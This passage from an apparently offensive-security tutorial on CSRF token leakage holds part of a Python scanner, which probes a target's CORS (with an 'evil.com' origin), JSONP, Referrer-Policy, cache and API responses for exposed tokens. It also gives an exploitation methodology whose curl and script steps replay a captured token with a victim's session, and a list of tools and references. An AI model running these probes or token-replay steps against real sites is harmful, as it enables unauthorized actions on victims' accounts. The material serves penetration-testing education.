                            self.add_finding('CACHE_LEAK', 'CRITICAL',
                                f'Public cache on token page: {ep}', cache_control)
                        elif re.search(r'max-age=[1-9]', cache_control):
                            self.add_finding('CACHE_LEAK', 'MEDIUM',
                                f'Cacheable token page: {ep}', cache_control)
            except:
                pass
    
    def test_cors_leakage(self):
        print('\n[*] Testing: CORS Token Leakage')
        endpoints = ['/api/csrf-token', '/api/csrf', '/api/session',
                     '/api/me', '/api/user', '/api/user/profile',
                     '/api/auth/status']
        
        origins = ['https://evil.com', 'null', f'https://{self.domain}.evil.com',
                   f'https://evil.{self.domain}']
        
        for ep in endpoints:
            for origin in origins:
                try:
                    resp = self.session.get(f'{self.base}{ep}',
                        headers={'Origin': origin})
                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                    
                    has_token = bool(re.search('|'.join(self.TOKEN_PATTERNS), resp.text, re.I))
                    
                    if acao and has_token:
                        if acac.lower() == 'true':
                            self.add_finding('CORS_LEAK', 'CRITICAL',
                                f'CORS allows token reading: {ep}',
                                f'Origin={origin} ACAO={acao} ACAC={acac}')
                        elif acao == '*':
                            self.add_finding('CORS_LEAK', 'HIGH',
                                f'Wildcard CORS on token endpoint: {ep}',
                                f'Origin={origin} ACAO=*')
                except:
                    pass
    
    def test_referrer_policy(self):
        print('\n[*] Testing: Referrer-Policy')
        try:
            resp = self.session.get(self.base)
            policy = resp.headers.get('Referrer-Policy', '')
            meta_policy = re.search(r'<meta[^>]*referrer[^>]*content\s*=\s*["\']([^"\']+)', resp.text, re.I)
            
            effective_policy = policy or (meta_policy.group(1) if meta_policy else '')
            
            if not effective_policy:
                self.add_finding('REFERRER_LEAK', 'MEDIUM',
                    'No Referrer-Policy header set',
                    'Browser default: strict-origin-when-cross-origin')
            elif 'unsafe-url' in effective_policy.lower():
                self.add_finding('REFERRER_LEAK', 'HIGH',
                    'Dangerous Referrer-Policy: unsafe-url',
                    'Full URL including query params leaked to all origins')
            elif 'no-referrer-when-downgrade' in effective_policy.lower():
                self.add_finding('REFERRER_LEAK', 'MEDIUM',
                    'Weak Referrer-Policy: no-referrer-when-downgrade',
                    'Full URL leaked on HTTPS→HTTPS navigations')
        except:
            pass
    
    def test_jsonp(self):
        print('\n[*] Testing: JSONP Token Leakage')
        endpoints = ['/api/session', '/api/user', '/api/me',
                     '/api/csrf', '/api/profile', '/api/auth']
        callbacks = ['callback', 'cb', 'jsonp', 'func', 'fn']
        
        for ep in endpoints:
            for cb in callbacks:
                try:
                    resp = self.session.get(f'{self.base}{ep}?{cb}=pwn')
                    if 'pwn(' in resp.text:
                        has_token = bool(re.search('csrf|token|xsrf', resp.text, re.I))
                        severity = 'CRITICAL' if has_token else 'MEDIUM'
                        self.add_finding('JSONP_LEAK', severity,
                            f'JSONP endpoint found: {ep}?{cb}=pwn',
                            f'Contains token: {has_token}')
                except:
                    pass
    
    def test_external_resources(self):
        print('\n[*] Testing: External Resources on Token Pages')
        pages = ['/settings', '/profile', '/account', '/dashboard']
        
        for page in pages:
            try:
                resp = self.session.get(f'{self.base}{page}')
                has_token = bool(re.search('|'.join(self.TOKEN_PATTERNS), resp.text, re.I))
                
                if has_token:
                    externals = re.findall(
                        r'(?:src|href)\s*=\s*["\']?(https?://(?!' + 
                        re.escape(self.domain) + r')[^\s"\'<>]+)',
                        resp.text, re.I
                    )
                    unique_domains = set(urlparse(u).netloc for u in externals if urlparse(u).netloc)
                    
                    if unique_domains:
                        self.add_finding('EXTERNAL_RESOURCE', 'MEDIUM',
                            f'Token page {page} loads {len(unique_domains)} external domains',
                            ', '.join(list(unique_domains)[:5]))
            except:
                pass
    
    def test_api_response_exposure(self):
        print('\n[*] Testing: API Response Token Exposure')
        endpoints = ['/api/user', '/api/me', '/api/profile',
                     '/api/session', '/api/auth/status', '/api/dashboard',
                     '/api/settings', '/api/config']
        
        for ep in endpoints:
            try:
                resp = self.session.get(f'{self.base}{ep}')
                if resp.status_code == 200:
                    for pattern in self.TOKEN_PATTERNS:
                        match = re.search(pattern, resp.text, re.I)
                        if match:
                            self.add_finding('API_EXPOSURE', 'MEDIUM',
                                f'CSRF token in API response: {ep}',
                                f'Pattern: {pattern[:50]}')
                            break
            except:
                pass
    
    def run_all(self):
        print(f'[*] CSRF Token Leakage Analysis: {self.base}')
        print(f'[*] Started: {datetime.now().isoformat()}\n')
        
        self.test_url_token_exposure()
        self.test_cache_headers()
        self.test_cors_leakage()
        self.test_referrer_policy()
        self.test_jsonp()
        self.test_external_resources()
        self.test_api_response_exposure()
        
        # Summary
        print(f'\n{"=" * 50}')
        print(f'[*] Total findings: {len(self.findings)}')
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = sum(1 for f in self.findings if f['severity'] == sev)
            if count:
                print(f'  {sev}: {count}')
        
        report = {
            'target': self.base,
            'scan_date': datetime.now().isoformat(),
            'findings': self.findings
        }
        with open('csrf_leakage_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        print(f'\n[*] Report saved: csrf_leakage_report.json')

if __name__ == '__main__':
    base = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com'
    cookie = sys.argv[2] if len(sys.argv) > 2 else 'SESSION'
    
    analyzer = CSRFLeakageAnalyzer(base, {'session': cookie})
    analyzer.run_all()
```
::

## Exploitation Decision Methodology

::steps{level="4"}

#### Identify Token Placement & Transport

```bash
# Where does the CSRF token live?
# Check: URL params, headers, body, cookies, meta tags,
#        localStorage, sessionStorage, JS variables, API responses

# How is it transmitted?
# Check: Form hidden fields, AJAX headers, query strings,
#        cookie double-submit, postMessage, WebSocket
```

#### Assess Leakage Vectors

```bash
# For each token placement, evaluate:
# URL token → Referer leak? Log exposure? Cache? History?
# Header token → Where is it read from? XSS-accessible source?
# Cookie token → HttpOnly? Domain scope? Subdomain injection?
# Client storage → XSS accessible? Extension accessible?
# API response → CORS policy? JSONP available?
```

#### Test Exploitability

```bash
# Can you capture the token?
# - Inject external resources on token pages (Referer leak)
# - Exploit CORS misconfiguration (read API response)
# - Use JSONP endpoint (cross-origin script load)
# - Exploit XSS to read DOM/storage/cookie
# - Access cached pages (CDN/browser cache)
# - Read server logs (log exposure)
```

#### Capture Token & Validate

```bash
# Extract token via identified vector
# Verify token is valid and not expired
curl -X POST https://target.com/api/test \
  -H "X-CSRF-Token: CAPTURED_TOKEN" \
  -H "Cookie: session=VICTIM" \
  -d '{"test":"validate"}'
```

#### Execute Attack with Captured Token

```bash
# Use valid token for state-changing requests
python3 exploit_with_token.py \
  "https://target.com" \
  "CAPTURED_TOKEN" \
  "VICTIM_SESSION"
```
::

## Tools & Resources

::card-group
  ::card
  ---
  title: Burp Suite Professional
  icon: i-lucide-shield-check
  to: https://portswigger.net/burp/pro
  target: _blank
  ---
  Primary proxy for token tracking, Sequencer for entropy analysis, Logger++ extension for CSRF header monitoring, and built-in CORS misconfiguration scanning.
  ::

  ::card
  ---
  title: XSRFProbe
  icon: i-lucide-bug
  to: https://github.com/0xInfection/XSRFProbe
  target: _blank
  ---
  Automated CSRF audit toolkit with token analysis, Referer/Origin validation testing, anti-CSRF token detection, and PoC generation capabilities.
  ::

  ::card
  ---
  title: CORScanner
  icon: i-lucide-scan
  to: https://github.com/chenjj/CORScanner
  target: _blank
  ---
  Fast CORS misconfiguration scanner. Identifies origins that can read cross-origin responses containing CSRF tokens via permissive ACAO policies.
  ::

  ::card
  ---
  title: Burp Sequencer
  icon: i-lucide-bar-chart-3
  to: https://portswigger.net/burp/documentation/desktop/tools/sequencer
  target: _blank
  ---
  Statistical randomness analyzer for CSRF tokens. Tests entropy, FIPS compliance, character distribution, and predictability of token generation.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-target
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based scanner with community templates for CSRF token leakage, missing Referrer-Policy, CORS misconfigurations, and exposed configuration files.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-terminal
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Web fuzzer for CSRF token brute force on short/weak tokens, API endpoint enumeration, and JSONP callback parameter discovery.
  ::

  ::card
  ---
  title: git-dumper
  icon: i-lucide-git-branch
  to: https://github.com/arthaud/git-dumper
  target: _blank
  ---
  Extracts exposed .git repositories that may contain CSRF secret keys, token generation logic, and application configuration with anti-CSRF secrets.
  ::

  ::card
  ---
  title: websocat
  icon: i-lucide-plug
  to: https://github.com/vi/websocat
  target: _blank
  ---
  Command-line WebSocket client for monitoring WebSocket traffic, testing cross-site WebSocket hijacking, and extracting tokens transmitted over WS channels.
  ::

  ::card
  ---
  title: Retire.js
  icon: i-lucide-alert-triangle
  to: https://github.com/RetireJS/retire.js
  target: _blank
  ---
  Identifies vulnerable JavaScript libraries loaded on token-bearing pages. Compromised third-party scripts can exfiltrate CSRF tokens via Referer or DOM access.
  ::

  ::card
  ---
  title: mitmproxy
  icon: i-lucide-network
  to: https://mitmproxy.org/
  target: _blank
  ---
  Scriptable HTTPS proxy for automated token capture from Referer headers, cookie analysis, response inspection, and real-time CSRF token tracking.
  ::

  ::card
  ---
  title: httpx
  icon: i-lucide-globe
  to: https://github.com/projectdiscovery/httpx
  target: _blank
  ---
  HTTP probing toolkit for bulk header analysis, cache-control validation, Referrer-Policy checking, and CORS policy enumeration across multiple endpoints.
  ::

  ::card
  ---
  title: subfinder
  icon: i-lucide-layers
  to: https://github.com/projectdiscovery/subfinder
  target: _blank
  ---
  Subdomain enumeration for identifying CORS bypass targets, subdomain takeover candidates for cookie injection, and same-site XSS vectors for token theft.
  ::
::

### Reference Materials

::card-group
  ::card
  ---
  title: "OWASP CSRF Prevention Cheat Sheet"
  icon: i-lucide-book-open
  to: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  target: _blank
  ---
  Comprehensive defense reference covering token patterns, synchronizer tokens, double-submit cookies, and SameSite attributes — understand defenses to find leakage.
  ::

  ::card
  ---
  title: "PortSwigger CSRF Research"
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/csrf
  target: _blank
  ---
  Interactive labs and research covering CSRF token validation bypasses, Referer-based defenses, token leakage scenarios, and SameSite cookie exploitation.
  ::

  ::card
  ---
  title: "HackTricks - CSRF"
  icon: i-lucide-skull
  to: https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
  target: _blank
  ---
  Community-maintained exploitation reference with token leakage vectors, CORS abuse techniques, and real-world bypass examples for modern frameworks.
  ::

  ::card
  ---
  title: "PayloadsAllTheThings - CSRF"
  icon: i-lucide-database
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
  target: _blank
  ---
  Payload repository with ready-to-use CSRF exploitation templates, token extraction techniques, and content-type bypass payloads.
  ::

  ::card
  ---
  title: "Fetch Standard - Referrer Policy"
  icon: i-lucide-file-code
  to: https://w3c.github.io/webappsec-referrer-policy/
  target: _blank
  ---
  W3C specification defining how browsers handle Referer headers. Essential for understanding which policies prevent or enable token leakage via Referer.
  ::

  ::card
  ---
  title: "MDN - Referrer-Policy"
  icon: i-lucide-book-marked
  to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy
  target: _blank
  ---
  Mozilla reference on Referrer-Policy values, default browser behaviors, per-element policies, and practical implications for token leakage via navigation.
  ::

  ::card
  ---
  title: "CORS Specification"
  icon: i-lucide-file-text
  to: https://fetch.spec.whatwg.org/#http-cors-protocol
  target: _blank
  ---
  Official CORS specification defining how browsers handle cross-origin requests. Critical for understanding when CSRF tokens in API responses become readable by attackers.
  ::

  ::card
  ---
  title: "Web Cache Deception Research"
  icon: i-lucide-hard-drive
  to: https://portswigger.net/research/web-cache-deception
  target: _blank
  ---
  PortSwigger research on web cache deception attacks that expose authenticated pages containing CSRF tokens through CDN/proxy cache manipulation.
  ::
::